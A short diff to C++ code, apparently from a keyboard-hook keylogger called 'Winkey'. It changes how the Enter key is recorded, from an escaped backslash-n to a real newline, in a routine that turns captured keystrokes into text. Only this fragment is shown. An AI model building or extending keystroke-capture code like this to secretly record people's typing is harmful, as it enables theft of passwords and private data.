@@ -190,7 +190,7 @@ std::string Winkey::solve(KBDLLHOOKSTRUCT *kbdEv) {
 	case VK_CONTROL:
 	case VK_LCONTROL:
 	case VK_RCONTROL:	return std::string("[CTRL]");
-	case VK_RETURN:		return std::string("\\n");
+	case VK_RETURN:		return std::string("\n");
 	default:
 		BYTE keyboardState[256];
 		GetKeyboardState(keyboardState);
